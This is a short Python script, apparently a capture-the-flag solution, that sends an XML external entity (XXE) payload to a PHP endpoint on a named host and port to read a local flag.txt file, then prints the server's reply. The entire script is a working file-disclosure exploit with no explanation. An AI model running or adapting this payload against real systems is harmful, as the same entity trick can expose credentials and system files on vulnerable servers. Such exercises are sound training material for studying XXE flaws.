import requests


data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <name>sfda</name>
  <tel>safsd</tel>
  <email>&xxe;</email>
  <password></password>
</root>"""

headers = {
    "Content-Type": "text/plain;charset=UTF-8"
}

req = requests.post("http://wsr.gmax.pro:30209/process.php", headers=headers, data=data)

print(req.text)